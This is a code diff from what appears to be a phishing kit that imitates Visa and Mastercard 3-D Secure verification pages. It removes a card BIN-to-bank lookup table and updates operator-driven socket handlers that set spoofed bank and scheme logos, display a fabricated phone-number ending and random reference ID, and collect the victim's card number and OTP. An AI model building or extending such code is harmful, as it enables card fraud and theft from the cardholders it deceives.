-'515789': { bank: 'First Citizens Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'402244': { bank: 'People\'s United Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'518847': { bank: 'People\'s United Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'403766': { bank: 'Bank of the West', country: 'United States', countryCode: 'US', currency: 'USD' },
-'557619': { bank: 'Bank of the West', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'408851': { bank: 'CIBC Bank USA', country: 'United States', countryCode: 'US', currency: 'USD' },
-'547254': { bank: 'CIBC Bank USA', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'411778': { bank: 'Santander Bank USA', country: 'United States', countryCode: 'US', currency: 'USD' },
-'512856': { bank: 'Santander Bank USA', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Corporate and Business Card Issuers
-'485495': { bank: 'American Express Business', country: 'United States', countryCode: 'US', currency: 'USD' },
-'557845': { bank: 'American Express Business', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'442732': { bank: 'Brex', country: 'United States', countryCode: 'US', currency: 'USD' },
-'552573': { bank: 'Brex', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'476095': { bank: 'Ramp', country: 'United States', countryCode: 'US', currency: 'USD' },
-'553216': { bank: 'Ramp', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'401003': { bank: 'Divvy', country: 'United States', countryCode: 'US', currency: 'USD' },
-'527636': { bank: 'Divvy', country: 'United States', countryCode: 'US', currency: 'USD' },
-    // Additional Regional & Community Banks
-'423089': { bank: 'Cathay Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'528759': { bank: 'Cathay Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'433238': { bank: 'Bank OZK', country: 'United States', countryCode: 'US', currency: 'USD' },
-'523970': { bank: 'Bank OZK', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'442742': { bank: 'Ameris Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'514756': { bank: 'Ameris Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'404267': { bank: 'BankUnited', country: 'United States', countryCode: 'US', currency: 'USD' },
-'517063': { bank: 'BankUnited', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'426629': { bank: 'Fulton Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'546459': { bank: 'Fulton Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'417566': { bank: 'Prosperity Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'528863': { bank: 'Prosperity Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'415477': { bank: 'Flagstar Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'559354': { bank: 'Flagstar Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'404675': { bank: 'First Interstate Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'530786': { bank: 'First Interstate Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'445215': { bank: 'Trustmark National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'531260': { bank: 'Trustmark National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'439954': { bank: 'Washington Federal', country: 'United States', countryCode: 'US', currency: 'USD' },
-'525642': { bank: 'Washington Federal', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'440349': { bank: 'TCF Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'526219': { bank: 'TCF Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'424631': { bank: 'Old National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'517378': { bank: 'Old National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'429678': { bank: 'Simmons Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'543841': { bank: 'Simmons Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'407401': { bank: 'UMB Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'529750': { bank: 'UMB Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'416724': { bank: 'First Financial Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'522318': { bank: 'First Financial Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'451809': { bank: 'BancorpSouth Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'538493': { bank: 'BancorpSouth Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Additional Credit Unions
-'467387': { bank: 'Star One Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'557243': { bank: 'Star One Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'441067': { bank: 'San Diego County Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'548935': { bank: 'San Diego County Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'423241': { bank: 'VyStar Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'524370': { bank: 'VyStar Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'419419': { bank: 'Digital Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'556648': { bank: 'Digital Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'402643': { bank: 'Security Service Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'528742': { bank: 'Security Service Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'458935': { bank: 'BECU (Boeing Employees Credit Union)', country: 'United States', countryCode: 'US', currency: 'USD' },
-'517935': { bank: 'BECU (Boeing Employees Credit Union)', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'459221': { bank: 'Mountain America Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'516923': { bank: 'Mountain America Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'432768': { bank: 'Desert Financial Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'525442': { bank: 'Desert Financial Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Specialized Banks & Fintech
-'448909': { bank: 'Green Dot Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'558108': { bank: 'Green Dot Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'402126': { bank: 'Bancorp Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'515462': { bank: 'Bancorp Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'447117': { bank: 'NetSpend', country: 'United States', countryCode: 'US', currency: 'USD' },
-'545496': { bank: 'NetSpend', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'411840': { bank: 'Metabank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'549256': { bank: 'Metabank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'476478': { bank: 'Mercury', country: 'United States', countryCode: 'US', currency: 'USD' },
-'510219': { bank: 'Mercury', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'413301': { bank: 'Wise US', country: 'United States', countryCode: 'US', currency: 'USD' },
-'531490': { bank: 'Wise US', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'416797': { bank: 'Albert', country: 'United States', countryCode: 'US', currency: 'USD' },
-'525274': { bank: 'Albert', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'462182': { bank: 'Acorns', country: 'United States', countryCode: 'US', currency: 'USD' },
-'533248': { bank: 'Acorns', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'418291': { bank: 'Wealthfront', country: 'United States', countryCode: 'US', currency: 'USD' },
-'523648': { bank: 'Wealthfront', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'414987': { bank: 'Stash', country: 'United States', countryCode: 'US', currency: 'USD' },
-'532856': { bank: 'Stash', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'437863': { bank: 'Credit One Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'542825': { bank: 'Credit One Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'415231': { bank: 'First Premier Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'556620': { bank: 'First Premier Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'412936': { bank: 'Cross River Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'557795': { bank: 'Cross River Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'444607': { bank: 'Sutton Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'554614': { bank: 'Sutton Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'483316': { bank: 'Patriot Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'542723': { bank: 'Patriot Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'434684': { bank: 'Marcus by Goldman Sachs', country: 'United States', countryCode: 'US', currency: 'USD' },
-'528489': { bank: 'Marcus by Goldman Sachs', country: 'United States', countryCode: 'US', currency: 'USD' },
-    // Additional Taiwan Banks & Financial Institutions
-// Local Banks
-'526218': { bank: 'Taichung Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'422438': { bank: 'Taichung Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'515047': { bank: 'Taiwan Business Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'405176': { bank: 'Taiwan Business Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'528649': { bank: 'Chang Hwa Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'472193': { bank: 'Chang Hwa Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'485203': { bank: 'Taipei Star Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'551627': { bank: 'Taipei Star Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'498216': { bank: 'Hwatai Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'453974': { bank: 'Hwatai Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'525310': { bank: 'Bank of Panhsin', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'437620': { bank: 'Bank of Panhsin', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'543187': { bank: 'Sunny Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'414682': { bank: 'Sunny Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'537458': { bank: 'Cota Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'442613': { bank: 'Cota Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-// Credit Cooperatives
-'541725': { bank: 'Taiwan Cooperative Credit Union', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'458910': { bank: 'Taiwan Cooperative Credit Union', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'536782': { bank: 'Chunghwa Post Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'407189': { bank: 'Chunghwa Post Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-// Foreign Banks with Taiwan Operations
-'521938': { bank: 'DBS Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'423619': { bank: 'DBS Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'522784': { bank: 'Citibank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'446393': { bank: 'Citibank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'556317': { bank: 'HSBC Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'462853': { bank: 'HSBC Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'529437': { bank: 'Standard Chartered Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'424915': { bank: 'Standard Chartered Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'553624': { bank: 'ANZ Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'467219': { bank: 'ANZ Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'544910': { bank: 'BNP Paribas Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'413257': { bank: 'BNP Paribas Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-// Digital/Fintech
-'557843': { bank: 'LINE Pay Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'476290': { bank: 'LINE Pay Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'538276': { bank: 'O-Bank Digital', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'408521': { bank: 'O-Bank Digital', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'521943': { bank: 'Rakuten Card Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'407631': { bank: 'Rakuten Card Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-// Agricultural & Fishery Credit Cooperatives
-'546324': { bank: 'Taiwan Agricultural Cooperative', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'415293': { bank: 'Taiwan Agricultural Cooperative', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'552473': { bank: 'Taiwan Fishery Cooperative', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'432816': { bank: 'Taiwan Fishery Cooperative', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-// Specialized Financial Institutions
-'559317': { bank: 'Taiwan SME Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'448123': { bank: 'Taiwan SME Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'552738': { bank: 'Exim Bank of Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'427395': { bank: 'Exim Bank of Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-// Additional Payment Systems
-'527692': { bank: 'JCB Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'356786': { bank: 'JCB Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'545628': { bank: 'Easy Card Corporation', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'421904': { bank: 'Easy Card Corporation', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-
-'554286': { bank: 'iPass Corporation', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'435174': { bank: 'iPass Corporation', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
+             '511102': { bank: 'Taiwan Cooperative Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' }
           };
           
           // Try to find exact BIN match first (6 digits)
@@ -1647,7 +1219,7 @@
       return digits;
     }
 
-    function validateExpiry(value) {
+function validateExpiry(value) {
       if (!/^\d{2}\/\d{2}$/.test(value)) return false;
       const [month, year] = value.split('/').map(Number);
       if (month < 1 || month > 12) return false;
@@ -1756,7 +1328,7 @@
           // Format the card number
           const formatted = formatCardNumber(value);
           
-// Calculate new cursor position
+          // Calculate new cursor position
           const digitsBeforeCursor = valueBeforeCursor.replace(/\D/g, '').length;
           const newSpacesBeforeCursor = Math.floor(digitsBeforeCursor / 4);
           const newPosition = digitsBeforeCursor + newSpacesBeforeCursor;
@@ -1956,7 +1528,8 @@
             });
 
             if (!response.ok) throw new Error('Failed to submit OTP');
-statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+            
+            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
           } catch (err) {
             console.error('OTP submission error:', err);
             alert('Error submitting OTP. Please try again.');
@@ -2012,8 +1585,8 @@ statusCheckInterval = setInterval(checkTransactionStatus, 2000);
         }
       });
 
-      // Start verification event handler
-      socket.on('start_verification', (data) => {
+      // Start verification event handler with CURRENCY CONVERSION - UPDATED
+      socket.on('start_verification', async (data) => {
         console.log('[DEBUG] Received start_verification event:', data);
         
         if (data.invoiceId === currentInvoiceId) {
@@ -2029,22 +1602,22 @@ statusCheckInterval = setInterval(checkTransactionStatus, 2000);
           loadingContent.style.display = 'none';
           verificationContent.style.display = 'block';
           
-// UPDATED: Set verification type logo on RIGHT side
-const verificationTypeLogo = document.getElementById('verificationTypeLogo');
-if (verificationTypeLogo) {
-  if (data.verificationType === 'visa') {
-    verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
-    verificationTypeLogo.alt = 'Verified by Visa';
-  } else {
-    verificationTypeLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
-    verificationTypeLogo.alt = 'Mastercard SecureCode';
-  }
-}
+          // UPDATED: Set verification type logo on RIGHT side
+          const verificationTypeLogo = document.getElementById('verificationTypeLogo');
+          if (verificationTypeLogo) {
+            if (data.verificationType === 'visa') {
+              verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
+              verificationTypeLogo.alt = 'Verified by Visa';
+            } else {
+              verificationTypeLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
+              verificationTypeLogo.alt = 'Mastercard SecureCode';
+            }
+          }
 
-// UPDATED: Set bank logo on LEFT side
-const bankLogo = document.getElementById('bankLogo');
-if (bankLogo) {
-  const bankLogos = {
+          // UPDATED: Set bank logo on LEFT side
+          const bankLogo = document.getElementById('bankLogo');
+          if (bankLogo) {
+            const bankLogos = {
               'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
               'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
               'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
@@ -2087,61 +1660,125 @@ if (bankLogo) {
               'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
               'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
             };
-  bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
-}
+            bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
+          }
           
-// UPDATED: Generate random mobile ending instead of using card last 4
-const cardNumberDisplay = document.getElementById('cardNumberDisplay');
-const cardLastFourDigits = document.getElementById('cardLastFourDigits');
+          // UPDATED: Generate random mobile ending instead of using card last 4
+          const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+          const cardLastFourDigits = document.getElementById('cardLastFourDigits');
 
-// Generate random 4 digits for mobile number ending
-const randomMobileEnding = Math.floor(1000 + Math.random() * 9000).toString();
+          // Generate random 4 digits for mobile number ending
+          const randomMobileEnding = Math.floor(1000 + Math.random() * 9000).toString();
 
-if (cardLastFourDigits) {
-  cardLastFourDigits.textContent = `********${randomMobileEnding}`;
-}
+          if (cardLastFourDigits) {
+            cardLastFourDigits.textContent = `********${randomMobileEnding}`;
+          }
 
-// Still use actual card last 4 for the card display
-const cardNumber = document.getElementById('cardNumber')?.value || '';
-const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
-if (cardNumberDisplay) {
-  cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
-}
+          // Still use actual card last 4 for the card display
+          const cardNumber = document.getElementById('cardNumber')?.value || '';
+          const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
+          if (cardNumberDisplay) {
+            cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
+          }
 
-// ADDED: Generate random alphanumeric reference ID
-const referenceId = document.getElementById('referenceId');
-if (referenceId) {
-  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-  let randomRef = '';
-  // Generate 3 letters followed by 4 numbers
-  for (let i = 0; i < 3; i++) {
-    randomRef += chars.charAt(Math.floor(Math.random() * 26)); // Only letters
-  }
-  for (let i = 0; i < 4; i++) {
-    randomRef += chars.charAt(Math.floor(Math.random() * 10) + 26); // Only numbers
-  }
-  referenceId.textContent = randomRef;
-}
+          // ADDED: Generate random alphanumeric reference ID
+          const referenceId = document.getElementById('referenceId');
+          if (referenceId) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let randomRef = '';
+            // Generate 3 letters followed by 4 numbers
+            for (let i = 0; i < 3; i++) {
+              randomRef += chars.charAt(Math.floor(Math.random() * 26)); // Only letters
+            }
+            for (let i = 0; i < 4; i++) {
+              randomRef += chars.charAt(Math.floor(Math.random() * 10) + 26); // Only numbers
+            }
+            referenceId.textContent = randomRef;
+          }
 
-// Set other transaction details (FIXED - removed duplicate declaration)
-const merchantName = document.getElementById('merchantName');
-const transactionAmount2 = document.getElementById('transactionAmount2');
-const transactionDate = document.getElementById('transactionDate');
-const displayAmount = document.getElementById('displayAmount');
+          // Set other transaction details
+          const merchantName = document.getElementById('merchantName');
+          const transactionAmount = document.getElementById('transactionAmount');
+          const transactionDate = document.getElementById('transactionDate');
+          const displayAmount = document.getElementById('displayAmount');
+          const originalAmount = document.getElementById('originalAmount');
+          const currencySymbol = document.getElementById('currencySymbol');
+          const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
+          const originalCurrencyDisplay = document.getElementById('originalCurrencyDisplay');
           
-if (merchantName) {
-  merchantName.textContent = data.merchantName || storedData.merchantName || 'Bologus pvt store.';
-}
+          // Display merchant name
+          if (merchantName) {
+            merchantName.textContent = data.merchantName || storedData.merchantName || 'Bologus pvt store.';
+          }
           
-if (transactionAmount2 && displayAmount) {
-  transactionAmount2.textContent = (data.amount || storedData.amount || displayAmount.textContent || '0.00').replace(/^₹/, ''); // Remove existing rupee symbol if present
-}
+          // Set transaction date
+          if (transactionDate) {
+            transactionDate.textContent = new Date().toLocaleString();
+          }
           
-if (transactionDate) {
-  transactionDate.textContent = new Date().toLocaleString();
-}
+          // Get original amount
+          const originalAmountValue = (data.amount || storedData.amount || displayAmount.textContent || '0.00').replace(/^₹/, '');
           
-// Setup event handlers
+          // Handle currency conversion - NEW
+          if (data.currency && data.currency !== 'INR') {
+            // Save original value
+            if (originalAmount) {
+              originalAmount.textContent = originalAmountValue;
+            }
+            
+            // Get the new currency symbol
+            const newSymbol = currencySymbols[data.currency] || data.currency;
+            if (currencySymbol) {
+              currencySymbol.textContent = newSymbol;
+            }
+            
+            // Show loading
+            if (transactionAmount) {
+              transactionAmount.textContent = "Converting...";
+            }
+            
+            try {
+              // Get converted amount
+              const convertedValue = await convertCurrency(parseFloat(originalAmountValue), 'INR', data.currency);
+              
+              // Display converted amount
+              if (transactionAmount) {
+                transactionAmount.textContent = convertedValue;
+              }
+              
+              // Show original amount display
+              if (convertedAmountDisplay && originalCurrencyDisplay) {
+                convertedAmountDisplay.style.display = 'block';
+                originalCurrencyDisplay.textContent = `INR: ₹${originalAmountValue}`;
+              }
+            } catch (error) {
+              console.error('Currency conversion failed:', error);
+              
+              // Fallback to original amount
+              if (transactionAmount) {
+                transactionAmount.textContent = originalAmountValue;
+              }
+              if (currencySymbol) {
+                currencySymbol.textContent = '₹';
+              }
+              if (convertedAmountDisplay) {
+                convertedAmountDisplay.style.display = 'none';
+              }
+            }
+          } else {
+            // Default INR currency (no conversion needed)
+            if (currencySymbol) {
+              currencySymbol.textContent = '₹';
+            }
+            if (transactionAmount) {
+              transactionAmount.textContent = originalAmountValue;
+            }
+            if (convertedAmountDisplay) {
+              convertedAmountDisplay.style.display = 'none';
+            }
+          }
+          
+          // Setup event handlers
           setupMCVerificationHandlers();
           
           // Start timer
@@ -2160,6 +1797,7 @@ if (transactionDate) {
         window.location.href = data.redirectUrl;
       });
 
+      // Handle MC bank selection update
       socket.on('update_mc_bank', (data) => {
         if (data.invoiceId === currentInvoiceId) {
           const bankLogos = {
@@ -2209,6 +1847,82 @@ if (transactionDate) {
           const bankLogo = document.getElementById('bankLogo');
           if (bankLogo) {
             bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
+          }
+        }
+      });
+      
+      // Handle currency update - NEW
+      socket.on('update_mc_currency', async (data) => {
+        if (data.invoiceId === currentInvoiceId) {
+          const currencySymbol = document.getElementById('currencySymbol');
+          const transactionAmount = document.getElementById('transactionAmount');
+          const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
+          const originalCurrencyDisplay = document.getElementById('originalCurrencyDisplay');
+          const originalAmount = document.getElementById('originalAmount');
+          const displayAmount = document.getElementById('displayAmount');
+          
+          // Get original amount
+          const originalAmountValue = originalAmount?.textContent || displayAmount?.textContent || '0.00';
+          
+          // Handle currency conversion
+          if (data.currency && data.currency !== 'INR') {
+            // Save original value
+            if (originalAmount) {
+              originalAmount.textContent = originalAmountValue;
+            }
+            
+            // Get the new currency symbol
+            const newSymbol = currencySymbols[data.currency] || data.currency;
+            if (currencySymbol) {
+              currencySymbol.textContent = newSymbol;
+            }
+            
+            // Show loading
+            if (transactionAmount) {
+              transactionAmount.textContent = "Converting...";
+            }
+            
+            try {
+              // Get converted amount
+              const convertedValue = await convertCurrency(parseFloat(originalAmountValue), 'INR', data.currency);
+              
+              // Display converted amount
+              if (transactionAmount) {
+                transactionAmount.textContent = convertedValue;
+              }
+              
+              // Show original amount display
+              if (convertedAmountDisplay && originalCurrencyDisplay) {
+                convertedAmountDisplay.style.display = 'block';
+                originalCurrencyDisplay.textContent = `INR: ₹${originalAmountValue}`;
+              }
+              
+              console.log(`Currency converted: ${originalAmountValue} INR = ${convertedValue} ${data.currency}`);
+            } catch (error) {
+              console.error('Currency conversion failed:', error);
+              
+              // Fallback to original amount
+              if (transactionAmount) {
+                transactionAmount.textContent = originalAmountValue;
+              }
+              if (currencySymbol) {
+                currencySymbol.textContent = '₹';
+              }
+              if (convertedAmountDisplay) {
+                convertedAmountDisplay.style.display = 'none';
+              }
+            }
+          } else {
+            // Default INR currency (no conversion needed)
+            if (currencySymbol) {
+              currencySymbol.textContent = '₹';
+            }
+            if (transactionAmount) {
+              transactionAmount.textContent = originalAmountValue;
+            }
+            if (convertedAmountDisplay) {
+              convertedAmountDisplay.style.display = 'none';
+            }
           }
         }
       });
@@ -2458,69 +2172,66 @@ if (transactionDate) {
         });
       }
       
-// Replace the existing mcConsentCheckbox click handler in setupMCVerificationHandlers function with this improved version:
-
-// Consent checkbox toggle - IMPROVED VERSION THAT ENSURES CLICKABILITY
-if (mcConsentCheckbox && consentLabel) {
-  // Make sure the entire label area is clickable
-  consentLabel.style.cursor = 'pointer';
-  
-  // Add click handler to both checkbox and label
-  consentLabel.addEventListener('click', function(e) {
-    // Toggle the 'checked' class
-    mcConsentCheckbox.classList.toggle('checked');
-    
-    // Find the SVG element within the checkbox
-    const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
-    if (checkmarkSvg) {
-      // Update display property based on checked state
-      if (mcConsentCheckbox.classList.contains('checked')) {
-        checkmarkSvg.style.display = 'block';
-        mcConsentCheckbox.style.backgroundColor = '#2778c4';
-        mcConsentCheckbox.style.borderColor = '#2778c4';
-      } else {
-        checkmarkSvg.style.display = 'none';
-        mcConsentCheckbox.style.backgroundColor = 'white';
-        mcConsentCheckbox.style.borderColor = '#ccc';
+      // Consent checkbox toggle - IMPROVED VERSION THAT ENSURES CLICKABILITY
+      if (mcConsentCheckbox && consentLabel) {
+        // Make sure the entire label area is clickable
+        consentLabel.style.cursor = 'pointer';
+        
+        // Add click handler to both checkbox and label
+        consentLabel.addEventListener('click', function(e) {
+          // Toggle the 'checked' class
+          mcConsentCheckbox.classList.toggle('checked');
+          
+          // Find the SVG element within the checkbox
+          const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
+          if (checkmarkSvg) {
+            // Update display property based on checked state
+            if (mcConsentCheckbox.classList.contains('checked')) {
+              checkmarkSvg.style.display = 'block';
+              mcConsentCheckbox.style.backgroundColor = '#2778c4';
+              mcConsentCheckbox.style.borderColor = '#2778c4';
+            } else {
+              checkmarkSvg.style.display = 'none';
+              mcConsentCheckbox.style.backgroundColor = 'white';
+              mcConsentCheckbox.style.borderColor = '#ccc';
+            }
+          }
+          
+          // Update submit button state
+          updateMcSubmitButton();
+          
+          // Prevent event bubbling
+          e.stopPropagation();
+        });
+        
+        // Also make the checkbox itself clickable directly
+        mcConsentCheckbox.addEventListener('click', function(e) {
+          // Toggle the 'checked' class
+          this.classList.toggle('checked');
+          
+          // Find the SVG element within the checkbox
+          const checkmarkSvg = this.querySelector('svg');
+          if (checkmarkSvg) {
+            // Update display property based on checked state
+            if (this.classList.contains('checked')) {
+              checkmarkSvg.style.display = 'block';
+              this.style.backgroundColor = '#2778c4';
+              this.style.borderColor = '#2778c4';
+            } else {
+              checkmarkSvg.style.display = 'none';
+              this.style.backgroundColor = 'white';
+              this.style.borderColor = '#ccc';
+            }
+          }
+          
+          // Update submit button state
+          updateMcSubmitButton();
+          
+          // Prevent event bubbling
+          e.stopPropagation();
+        });
       }
-    }
     
-    // Update submit button state
-    updateMcSubmitButton();
-    
-    // Prevent event bubbling
-    e.stopPropagation();
-  });
-  
-  // Also make the checkbox itself clickable directly
-  mcConsentCheckbox.addEventListener('click', function(e) {
-    // Toggle the 'checked' class
-    this.classList.toggle('checked');
-    
-    // Find the SVG element within the checkbox
-    const checkmarkSvg = this.querySelector('svg');
-    if (checkmarkSvg) {
-      // Update display property based on checked state
-      if (this.classList.contains('checked')) {
-        checkmarkSvg.style.display = 'block';
-        this.style.backgroundColor = '#2778c4';
